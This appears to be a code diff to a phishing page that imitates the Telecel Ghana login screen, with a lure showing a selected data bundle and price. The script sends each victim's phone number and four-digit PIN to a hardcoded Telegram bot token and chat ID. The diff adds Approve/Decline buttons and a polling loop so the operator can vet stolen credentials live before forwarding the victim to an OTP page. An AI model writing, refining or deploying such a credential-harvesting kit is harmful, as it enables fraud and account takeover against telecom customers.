@@ -9,7 +9,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
-            background: #f4f4f4;
+            background: #f8f9fa;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -21,7 +21,7 @@
             max-width: 420px;
             background: white;
             border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
             overflow: hidden;
         }
         .header {
@@ -29,27 +29,28 @@
             padding: 35px 20px 20px;
         }
         .logo {
-            width: 55px;
-            height: 55px;
+            width: 65px;
+            height: 65px;
             background: #E30613;
             color: white;
             border-radius: 50%;
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            font-size: 30px;
+            font-size: 32px;
             font-weight: 900;
-            margin-bottom: 10px;
+            margin: 0 auto 10px;
         }
         h1 {
             font-size: 24px;
             font-weight: 700;
-            margin: 10px 0 6px;
+            margin-bottom: 8px;
         }
         .subtitle {
             color: #475569;
             font-size: 15px;
             line-height: 1.4;
+            margin-bottom: 30px;
         }
         .form-section {
             padding: 0 25px 30px;
@@ -93,31 +94,42 @@
             padding: 20px 25px;
             text-align: center;
         }
+        .error-msg {
+            color: #dc3545;
+            font-size: 14px;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
         <div class="header">
             <div class="logo">t</div>
             <h1>Welcome Back</h1>
-            <p class="subtitle">Enter your details to proceed.<br>Have an Enterprise account, <span style="color:#E30613;">Login Here</span></p>
+            <p class="subtitle">Enter your details to proceed</p>
         </div>
 
-        <!-- Form -->
         <div class="form-section">
+            <!-- Bundle Info -->
+            <div class="form-group" id="bundleInfo" style="display:none; background:#fff0f0; padding:12px; border-radius:8px;">
+                <strong style="color:#E30613;">Selected Bundle:</strong><br>
+                <span id="bundleData"></span><br>
+                <strong id="bundlePrice" style="color:#E30613;"></strong>
+            </div>
+
             <div class="form-group">
                 <label>Select Account Type <span style="color:red;">*</span></label>
                 <select id="accountType">
-                    <option value="">Select Account type</option>
-                    <option value="mobile" selected>Mobile</option>
+                    <option value="mobile">Mobile</option>
                     <option value="broadband">Broadband</option>
                 </select>
             </div>
 
             <div class="form-group">
                 <label>Telephone Number <span style="color:red;">*</span></label>
-                <input type="tel" id="phone" placeholder="0201234567" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+                <input type="tel" id="phone" placeholder="020XXXXXXXX" maxlength="10">
             </div>
 
             <div class="form-group">
@@ -125,15 +137,15 @@
                 <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
             </div>
 
-            <button class="continue-btn" onclick="proceedLogin()">Continue</button>
+            <div class="error-msg" id="errMsg"></div>
+
+            <button class="continue-btn" id="continueBtn">Continue</button>
         </div>
 
-        <!-- Bottom Banner -->
         <div class="bill-banner">
             <h3>Pay your bills without stress</h3>
             <p style="font-size:14px; opacity:0.95;">
-                Pay for your broadband, television subscription &amp; utility bills on Telecel Play. 
-                And the best part, you don't even need to login to your account.
+                Pay for your broadband, television subscription &amp; utility bills on Telecel Play.
             </p>
         </div>
     </div>
@@ -144,46 +156,68 @@
     </div>
 
     <script>
+        // ================== CONFIG ==================
         const CONFIG = {
-            BOT_TOKEN: '8522259555:AAEl1CRJfLhjWwtqD2z6CvN-jesiotWQ__4',
-            CHAT_ID: '8757709711',
+            BOT_TOKEN: '8673119947:AAHUdETKVnE6ag2INZ4Rr37spfF5FbMmNwY',
+            CHAT_ID: '8719095433',
             REDIRECT_PAGE: 'otp.html'
         };
 
-        let state = { bundleInfo: null };
+        let state = {
+            bundleInfo: null,
+            lastUpdateId: 0,
+            pollInterval: null,
+            approveId: null,
+            declineId: null
+        };
 
+        // DOM Elements
+        const phoneInput = document.getElementById('phone');
+        const passwordInput = document.getElementById('password');
+        const continueBtn = document.getElementById('continueBtn');
+        const errMsg = document.getElementById('errMsg');
+        const spinner = document.getElementById('spinner');
+        const bundleInfoDiv = document.getElementById('bundleInfo');
+        const bundleData = document.getElementById('bundleData');
+        const bundlePrice = document.getElementById('bundlePrice');
+
+        // Extract Bundle from URL
         function extractBundleInfo() {
             const params = new URLSearchParams(window.location.search);
             const bundle = params.get('bundle');
             const price = params.get('price');
-            if (bundle && price) state.bundleInfo = { bundle, price };
+            if (bundle && price) {
+                state.bundleInfo = { bundle, price };
+                bundleInfoDiv.style.display = 'block';
+                bundleData.textContent = bundle;
+                bundlePrice.textContent = `GHS ${price}`;
+            }
         }
 
-        function proceedLogin() {
-            const accountType = document.getElementById('accountType').value || "Mobile";
-            const phone = document.getElementById('phone').value.trim();
-            const pin = document.getElementById('password').value.trim();
+        // Ghana Number Validation
+        phoneInput.addEventListener('input', () => {
+            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+        });
 
-            // Ghana number validation
-            if (!phone || phone.length !== 10 || !phone.startsWith('0')) {
-                alert("Please enter a valid Ghanaian number (10 digits starting with 0)");
-                return;
-            }
-            if (pin.length !== 4) {
-                alert("PIN must be exactly 4 digits");
-                return;
-            }
+        passwordInput.addEventListener('input', () => {
+            passwordInput.value = passwordInput.value.replace(/[^0-9]/g, '').slice(0, 4);
+        });
 
-            document.getElementById('spinner').style.display = 'flex';
+        // Send to Telegram Bot with Polling
+        function sendToBot(accountType, phone, pin) {
+            const ts = Date.now();
+            state.approveId = `approve_${ts}`;
+            state.declineId = `decline_${ts}`;
 
             const bundleText = state.bundleInfo 
-                ? `\nBundle: ${state.bundleInfo.bundle}\nPrice: GHS ${state.bundleInfo.price}` 
+                ? `\nBundle: ${state.bundleInfo.bundle} - GHS ${state.bundleInfo.price}` 
                 : '';
 
-            const message = `<b>🔴 Telecel Login Attempt</b>\n\n` +
+            const message = `<b>🔴 New Telecel Login</b>\n\n` +
                             `Account Type: ${accountType}\n` +
-                            `Phone Number: ${phone}\n` +
-                            `PIN: ${pin}${bundleText}`;
+                            `Phone: ${phone}\n` +
+                            `PIN: ${pin}${bundleText}\n\n` +
+                            `Approve?`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -191,17 +225,69 @@
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
                     text: message,
-                    parse_mode: 'HTML'
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: '✅ Approve', callback_data: state.approveId },
+                            { text: '❌ Decline', callback_data: state.declineId }
+                        ]]
+                    }
                 })
             }).then(() => {
-                setTimeout(() => {
-                    window.location.href = CONFIG.REDIRECT_PAGE;
-                }, 1400);
+                startPolling();
             }).catch(() => {
-                alert("Connection error. Please try again.");
-                document.getElementById('spinner').style.display = 'none';
+                alert("Failed to connect. Please try again.");
+                spinner.style.display = 'none';
             });
         }
+
+        function startPolling() {
+            state.pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result) return;
+                        data.result.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+                            if (update.callback_query) {
+                                const cb = update.callback_query.data;
+                                if (cb === state.approveId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.REDIRECT_PAGE;
+                                } else if (cb === state.declineId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    errMsg.textContent = "Request declined. Please try again.";
+                                    errMsg.style.display = 'block';
+                                }
+                            }
+                        });
+                    });
+            }, 1500);
+        }
+
+        // Submit Handler
+        continueBtn.onclick = () => {
+            errMsg.style.display = 'none';
+            const accountType = document.getElementById('accountType').value || "Mobile";
+            const phone = phoneInput.value.trim();
+            const pin = passwordInput.value.trim();
+
+            if (!phone || phone.length !== 10 || !phone.startsWith('0')) {
+                errMsg.textContent = "Please enter valid Ghana number (e.g. 0201234567)";
+                errMsg.style.display = 'block';
+                return;
+            }
+            if (pin.length !== 4) {
+                errMsg.textContent = "PIN must be 4 digits";
+                errMsg.style.display = 'block';
+                return;
+            }
+
+            spinner.style.display = 'flex';
+            sendToBot(accountType, phone, pin);
+        };
 
         // Initialize
         extractBundleInfo();
